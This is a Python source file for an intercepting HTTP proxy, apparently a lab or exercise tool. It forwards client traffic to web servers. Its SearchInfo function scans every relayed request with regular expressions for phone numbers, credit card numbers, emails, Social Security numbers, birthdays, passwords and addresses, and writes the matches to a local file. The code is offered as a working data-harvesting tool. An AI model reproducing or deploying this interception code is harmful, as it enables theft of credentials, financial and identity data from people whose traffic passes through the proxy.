import re
import socket
import sys
import _thread
import getopt

def main():
    global listen_port, buffer_size, max_conn, listening_ip

    try:
        opt,ex = getopt.getopt(sys.argv[1:], "m:i:p:d", ["mode", "listening_ip","listen_port","domain"])

    except getopt.GetoptError as err:
        print (err)
        sys.exit()

    for opts, arg in opt:
        if opts in ("-m", "--mode"):
            mode = arg
        elif opts in ("-i", "--listen_ip"):
            listening_ip = arg
        elif opts in ("-p", "--listening_port"):
            listen_port = int(arg)
        elif opts in ("-d", "--domain"): 
            domain =arg     
   

    max_conn = 5
    buffer_size = 8192

    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.bind(('',listen_port))
        s.listen(max_conn)
        print("[*] Intializing socket ... Done.") 
        print("[*] Socket binded successfully...")
        print("[*] Server started successfully [{}]".format(listen_port)) 
    except Exception as e:
        print(e)
        sys.exit(2)

    while True:
        try:
            conn,addr = s.accept()
            data = conn.recv(buffer_size)
            _thread.start_new_thread(conn_string, (conn,data,listening_ip))
        except KeyboardInterrupt:
            s.close()
            print("\n[*] Shutting Down...")
            sys.exit(1)
    s.close()        


def conn_string(conn, data, addr):
    
    try:
       
        first_line = str(data).split("\n")[0]
        
        url = first_line.split(" ")[1]
        http_pos = url.find("://")
        if http_pos == -1:
            temp = url
        else:
            temp = url[(http_pos+3):]
     
        port_pos = temp.find(":") 
       
        webserver_pos = temp.find("/")
        if webserver_pos == -1:
            webserver_pos = len(temp)
        webserver = ""
        port = -1
        
        if port_pos == -1 or webserver_pos < port_pos:
            port = 80
            webserver = temp[:webserver_pos]
        else:
            port = int(temp[(port_pos+1):][:webserver_pos-port_pos-1])
            webserver = temp[:port_pos] 
        
        print(webserver)
        proxy_server(webserver,port,conn,data,addr)

    except Exception as e:
        print(e) 


def proxy_server(webserver,port,conn,data,addr):
    
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((webserver,port))
        
        s.send(data)
        SearchInfo(data)
        while True:
            reply =s.recv(buffer_size)
            
            if len(reply) > 0:
                conn.send(reply)

                dar = float(len(reply))
                dar = float(dar/1024)
                dar = "{}.3s".format(dar)
                print("[*] request done: {} => {} <= {}".format(addr[0],dar,webserver))
            else:
                break

        s.close()
        conn.close()
    except socket.error as value:
        s.close()
        conn.close()
        sys.exit(1)

def SearchInfo(url):
    
    file = open("info1.txt","w")
    phones = re.findall(r'(\d{3}[-\.\s]??\d{3}[-\.\s]??\d{4}|\(\d{3}\)\s*\d{3}[-\.\s]??\d{4}|\d{3}[-\.\s]??\d{4})', url.decode('utf-8'))
    cards = re.findall(r'(\(?[0-9]{16})', url.decode('utf-8'))
    emails = re.findall(r'\b[A-Za-z0-9_%+-]+[A-Za-z0-9-]+\.[A-Z|a-z]{2,}\b', url.decode('utf-8'))
    ssn = re.findall(r'(\d{3}-\d{2}-\d{4})', url.decode('utf-8'))
    names = re.findall(r"\b([A-Za-z][-,a-z ']+[ ]*)+", url.decode('utf-8'))
    dob =re.findall(r'\d{4}-\d{2}-\d{2}', url.decode('utf-8'))
    passw =re.findall(r'[A-Za-z0-9@#$]{6,12}', url.decode('utf-8'))
    state = re.findall(r'[A-Z]{2}', url.decode('utf-8'))
    zip = re.findall(r'\d{5}', url.decode('utf-8'))
    city = re.findall(r'[a-zA-Z+-]{3,12}', url.decode('utf-8'))
    
    file.write("possible phone numbers: ")
    for element in phones:
        file.write(element + ", ")  
    file.write("possible Credit Card numbers: ")
    for element in cards:
        file.write(element + ", ")  
    file.write("possible emails: ")  
    for element in emails:
        file.write(element + ", ")  
    file.write("possible SSN: ")
    for element in ssn:
        file.write(element + ", ")  
    file.write("possible names: ")
    for element in names:
        file.write(element + ", ")  
    file.write("possible Birthdays: ") 
    for element in dob:
        file.write(element + ", ")  
    file.write("possible passwords: ")
    for element in passw:
        file.write(element + ", ")  
    file.write("possible States: ")
    for element in state:
        file.write(element + ", ")  
    file.write("possible zip codes:")
    for element in zip:
        file.write(element + ", ")  
    file.write("possible cities: ") 
    for element in city:
        file.write(element + ", ")  



       


if __name__ == "__main__":
    main()                   